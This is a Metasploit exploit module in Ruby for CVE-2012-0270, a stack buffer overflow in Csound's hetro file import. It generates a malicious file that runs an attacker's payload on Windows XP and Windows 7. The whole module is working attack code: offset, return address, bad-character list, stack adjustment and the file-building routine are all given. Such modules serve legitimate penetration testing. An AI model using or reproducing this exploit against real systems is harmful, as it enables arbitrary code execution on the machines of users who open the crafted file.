# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039; => &#039;Csound hetro File Handling Stack Buffer Overflow&#039;,
            &#039;Description&#039; => %q{
                    This module exploits a buffer overflow in Csound before 5.16.6.
                The overflow occurs when trying to import a malicious hetro file
                from tabular format.
                In order to achieve exploitation the user should import the malicious
                file through csound with a command like "csound -U het_import msf.csd file.het".
                This exploit doesn&#039;t work if the "het_import" command is used directly
                to convert the file.
            },
            &#039;License&#039; => MSF_LICENSE,
            &#039;Author&#039; =>
                [
                    &#039;Secunia&#039;, # Vulnerability discovery
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;Version&#039; => &#039;$Revision: $&#039;,
            &#039;References&#039; =>
                [
                    [ &#039;CVE&#039;, &#039;2012-0270&#039; ],
                    [ &#039;OSVDB&#039;, &#039;79491&#039; ],
                    [ &#039;BID&#039;, &#039;52144&#039; ],
                    [ &#039;URL&#039;, &#039;http://secunia.com/secunia_research/2012-3/&#039; ],
                    [ &#039;URL&#039;, &#039;http://csound.git.sourceforge.net/git/gitweb.cgi?p=csound/csound5.git;a=commit;h=7d617a9551fb6c552ba16874b71266fcd90f3a6f&#039;]
                ],
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039; => 650,
                    &#039;BadChars&#039; => "\x00\x0a\x1a\x2c\xff",
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment # add esp, -3500
                    &#039;DisableNops&#039; => &#039;True&#039;
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [ &#039;Csound 5.15 / Windows XP SP3 / Windows 7 SP1&#039;,
                        {
                            &#039;Offset&#039; => 132,
                            &#039;Ret&#039; => 0x6e955446 # push esp #  ret / libgcc_s_dw2-1.dll
                        }
                    ],
                ],
            &#039;Privileged&#039; => false,
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Feb 23 2012&#039;))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.csd&#039;]),
            ], self.class)
    end
 
    def exploit
        sploit = rand_text(target[&#039;Offset&#039;])
        sploit << [target.ret].pack("V")
        sploit << payload.encoded
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(sploit)
    end
 
end



